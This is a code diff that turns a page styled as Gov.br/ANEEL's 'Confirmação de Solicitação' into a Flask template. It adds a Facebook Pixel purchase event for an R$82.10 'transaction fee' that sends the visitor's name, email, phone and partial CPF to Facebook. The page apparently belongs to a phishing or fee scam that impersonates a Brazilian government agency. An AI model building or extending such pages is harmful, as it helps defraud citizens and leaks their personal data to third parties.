@@ -1,10 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gov.br - Confirmação de Solicitação</title>
+{% extends "base.html" %}
 
+{% block title %}Gov.br - Confirmação de Solicitação{% endblock %}
+
+{% block head %}
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -32,8 +30,9 @@
             }
         }
     </script>
-</head>
-<body class="bg-gray-50 min-h-screen flex flex-col">
+{% endblock %}
+
+{% block content %}
     <!-- Header -->
     <div class="bg-white py-4">
         <div class="container mx-auto px-4">
@@ -147,5 +146,21 @@
         <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
         <p class="text-sm mt-1">Central de Atendimento: 167</p>
     </div>
-</body>
-</html>
+
+    <!-- Facebook Pixel Purchase Event -->
+    <script>
+        fbq('track', 'Purchase', {
+            value: 82.10,
+            currency: 'BRL',
+            content_name: 'Taxa Transacional',
+            content_type: 'product',
+            content_ids: ['TX_TRANSACIONAL'],
+            transaction_id: '{{ '{}{}{}'.format(user_data.cpf[:3], current_year, user_data.cpf[3:6]) }}',
+            user_data: {
+                email: '{{ user_data.email }}',
+                phone: '{{ user_data.phone }}',
+                name: '{{ user_data.name }}'
+            }
+        });
+    </script>
+{% endblock %}
